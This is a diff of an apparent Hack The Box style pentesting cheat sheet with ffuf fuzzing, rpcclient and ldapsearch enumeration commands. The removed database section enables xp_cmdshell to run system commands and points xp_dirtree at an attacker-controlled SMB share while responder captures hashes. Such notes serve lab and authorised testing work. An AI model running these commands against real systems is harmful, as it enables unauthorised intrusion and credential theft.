@@ -26,11 +26,15 @@ nmap -sU --top-ports 20 -oN scan.nmap -vv $ip  (UDP)
 
 ### HTTP/HTTPS (80/443)
 
+{% hint style="info" %}
+Always look up documentation of service you're trying to exploit, 90% of the time the answer will be there if you feel all other vectors are off
+{% endhint %}
+
 <pre><code>(VHost)     ffuf -w /usr/share/wordlists/bitquark-subdomains-top100000.txt -u http://$IP:PORT -h (try -H) 'Host: FUZZ.board.htb' -f(c/s/w)   
 (Directory) ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$IP:PORT/FUZZ 
 (File fuzzing) ffuf -u http://localhost:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt    
-(HTTP GET)  ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx        
-(HTTP POST) ffuf -w [wordlist]:FUZZ -u [URL] -X POST -d '<a data-footnote-ref href="#user-content-fn-1">id=FUZZ</a>' -H 'header: value' -fs xxx  
+(HTTP GET)  ffuf -w [wordlist] -u [URL]/?FUZZ=key -fs xxx        
+(HTTP POST) ffuf -w [wordlist] -u [URL] -X POST -d '<a data-footnote-ref href="#user-content-fn-1">id=FUZZ</a>' -H 'header: value' -fs xxx  
 (Use raw request) : ffuf -request request.txt -request-proto http -w wordlist.txt -r [FUZZ should be present in the request]
 (Multiple params) ffuf -w list1.txt:W1 -w list2.txt:W2 -X POST -d "username=W1&#x26;password=W2" -u [URL] -fc 200
 -p "1.0" and -rate [25]  to rate limit incase of WAF
@@ -119,6 +123,7 @@ rpcclient -U '' -N 10.10.11.35
 rpcclient -U 'user'  10.10.11.35
 enumdomusers
 enumdomgroups
+querydispinfo (less info about all users)
 querygroup [RID]
 queryuser [RID]
 enumprivs
@@ -159,41 +164,6 @@ ldapsearch -H ldap://[ip] -x -b "DC=htb,DC=local" '(objectClass=Person)' sAMAcco
 ```
 
 {% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap" %}
-
-### MSSQL (1433)
-
-```
-.\SQLCMD.EXE -S localhost -U [user] -P [password] -d [database] -Q "select table_name from streamio_backup.information_schema.tables;"
-
-python3 mssqlclient.py [-port {opt}] [domain]/[user]:[password]@[dc] {-windows-auth}
-enable_xp_cmdshell
-EXECUTE sp_configure 'show advanced options', 1;
-EXECUTE sp_configure 'xp_cmdshell', 1;
-RECONFIGURE;
-EXECUTE xp_cmdshell 'whoami';
-
-sudo responder -I tun0
-EXEC master.sys.xp_dirtree '\\10.10.14.9\myshare',1, 1
-```
-
-### SQL (3306)
-
-Payload all the things for both please
-
-```
-mysql -h [IP] -u [username] -p
-```
-
-### PostgreSQL (5432)
-
-```
-psql -h localhost -p 5432 -U [user] -d [database]
-\list
-\c [dbname]
-\dt
-\d [table] (listing schema for table users)
-select * from [table];
-```
 
 {% embed url="https://web.archive.org/web/20200309204648/http://0daysecurity.com/penetration-testing/enumeration.html" %}
 
